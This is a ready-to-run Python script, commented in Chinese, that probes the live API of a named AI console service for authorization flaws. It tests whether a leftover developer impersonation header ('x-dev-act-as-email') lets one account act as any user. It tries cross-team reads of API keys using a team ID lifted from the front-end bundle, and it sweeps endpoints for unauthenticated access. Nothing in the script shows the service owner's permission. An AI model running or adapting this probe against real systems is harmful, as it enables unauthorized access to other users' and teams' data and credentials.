#!/usr/bin/env python3
"""river/probe_authz.py — 验证 /api/* 的授权边界（不需要注册新账号）。

背景：console 前端的请求封装（bundle 里的 zS()）会带三个头：
    Authorization: Bearer <WorkOS JWT>
    X-River-Team:  <team_id>          个人账号为 null，不发
    x-dev-act-as-email: <email>       从 localStorage.dev_act_as_email 读

而 GET /api/auth/config 返回的 dev_login 是 false。
问题：服务端在非dev 模式下到底认不认 x-dev-act-as-email？
     认 → 越权读任意用户数据；不认 → 前端留了个死头。

用法：
    # 1) 先在 https://console.river.ai 正常登录，从 DevTools 复制 access_token
    export RIVER_TOKEN="eyJhbGciOi..."
    export RIVER_ME="you@example.com"          # 你自己的邮箱

    # 2) 跑
    python3 river/probe_authz.py

    # 3) 想验水平越权，指定目标团队
    python3 river/probe_authz.py --team 05bc4bc0-9c14-4ca3-900a-053ba083ceb5
"""
import json
import os
import sys

import requests

CONSOLE = "https://console.river.ai"
UA = ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36")


def get(token, path, team=None, dev_email=None, label=""):
    h = {"Authorization": f"Bearer {token}", "Accept": "application/json",
         "User-Agent": UA, "Origin": CONSOLE}
    if team:
        h["X-River-Team"] = team
    if dev_email:
        h["x-dev-act-as-email"] = dev_email
    try:
        r = requests.get(f"{CONSOLE}/api{path}", headers=h, timeout=30)
    except Exception as e:
        print(f"  [{label}] 请求异常: {e}")
        return None
    body = r.text[:400]
    try:
        body = json.dumps(r.json(), ensure_ascii=False)[:400]
    except Exception:
        pass
    print(f"  [{label}] {path} → {r.status_code}  {body}")
    return r


def post(path, token, payload, team=None, dev_email=None, label=""):
    h = {"Authorization": f"Bearer {token}", "Accept": "application/json",
         "Content-Type": "application/json", "User-Agent": UA, "Origin": CONSOLE}
    if team:
        h["X-River-Team"] = team
    if dev_email:
        h["x-dev-act-as-email"] = dev_email
    try:
        r = requests.post(f"{CONSOLE}/api{path}", headers=h, json=payload, timeout=30)
    except Exception as e:
        print(f"  [{label}] 请求异常: {e}")
        return None
    body = r.text[:400]
    try:
        body = json.dumps(r.json(), ensure_ascii=False)[:400]
    except Exception:
        pass
    print(f"  [{label}] POST {path} → {r.status_code}  {body}")
    return r


def main():
    token = os.environ.get("RIVER_TOKEN", "").strip()
    me = os.environ.get("RIVER_ME", "").strip()
    team = sys.argv[sys.argv.index("--team") + 1] if "--team" in sys.argv else None

    if not token:
        print("缺少 RIVER_TOKEN。")
        print("  1) 浏览器打开 https://console.river.ai 并登录")
        print("  2) DevTools → Application → Session Storage → 找 accessToken")
        print("  3) export RIVER_TOKEN='<那个值>'")
        return 1

    s = requests.Session()
    s.headers["User-Agent"] = UA

    print(f"\n=== 1. 基线：读自己的信息（token 前缀 {token[:12]}…） ===")
    get(token, "/me", label="me")
    get(token, "/keys", label="keys-baseline")

    print("\n=== 2. 未授权对照 ===")
    r = requests.get(f"{CONSOLE}/api/keys",
                     headers={"User-Agent": UA, "Origin": CONSOLE}, timeout=30)
    print(f"  [no-token] /keys → {r.status_code}  {r.text[:200]}")

    r = requests.get(f"{CONSOLE}/api/keys",
                     headers={"Authorization": "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.fake",
                              "User-Agent": UA}, timeout=30)
    print(f"  [fake-jwt] /keys → {r.status_code}  {r.text[:200]}")

    if not me:
        print("\n（未设 RIVER_ME，跳过 dev 后门头测试）")
        return 0

    print(f"\n=== 3. dev 后门头 x-dev-act-as-email（当前身份 {me}） ===")
    # 用一个确定不存在的邮箱做对照：服务端如果无视这个头，行为应与基线完全一致
    ghost = "definitely-not-a-real-user-9f3a2b@example.invalid"
    print("  先用不存在的邮箱探测（若返回 200 且内容与基线一致 → 头被忽略）")
    a = get(token, "/keys", dev_email=ghost, label="dev-ghost")

    print(f"  再换成自己的邮箱 {me}（若与 ghost 结果不同 → 头生效）")
    b = get(token, "/keys", dev_email=me, label="dev-self")

    print("\n  结论判定：")
    if a is None or b is None:
        print("    请求失败，无法判定")
    elif a.status_code == b.status_code and a.text == b.text:
        print("    → 两种邮箱返回完全一致，说明 x-dev-act-as-email 被服务端忽略")
        print("    → 该头只在 dev_login=true 时生效，当前是死头（前端遗留代码）")
    else:
        print("    → 返回不同！x-dev-act-as-email 生效了")
        print(f"      ghost → {a.status_code} {a.text[:200]}")
        print(f"      self  → {b.status_code} {b.text[:200]}")
        print("    → 这是越权：能用任意邮箱切换身份读数据")

    print("\n=== 4. X-River-Team 水平越权 ===")
    if team:
        get(token, "/keys", team=team, label="team-cross")
        print("  若返回的 key 列表与基线不同且非 403 → 跨团队读取成立")
    else:
        print("  未指定 --team，跳过")
        print("  试法：python3 river/probe_authz.py --team <别的 team_id>")
        print("  前端 bundle 里硬编码了一个：05bc4bc0-9c14-4ca3-900a-053ba083ceb5")

    print("\n=== 5. 只读接口批量过一遍（看有没有未授权可读的） ===")
    for p in ["/keys", "/projects", "/teams", "/usage", "/usage/pricing",
              "/billing/pricing", "/inference/models", "/inference/endpoints",
              "/deployments", "/checkpoints", "/model-access-requests",
              "/aws-marketplace/subscription"]:
        try:
            r = requests.get(f"{CONSOLE}/api{p}",
                             headers={"User-Agent": UA, "Origin": CONSOLE,
                                      "Accept": "application/json"}, timeout=20)
            if r.status_code == 200:
                txt = r.text[:160].replace("\n", " ")
                print(f"  ⚠ {p} → 200 无鉴权可读: {txt}")
            elif r.status_code not in (401, 403, 404):
                print(f"  · {p} → {r.status_code}")
        except Exception as e:
            print(f"  · {p} 异常 {str(e)[:40]}")

    return 0


if __name__ == "__main__":
    sys.exit(main())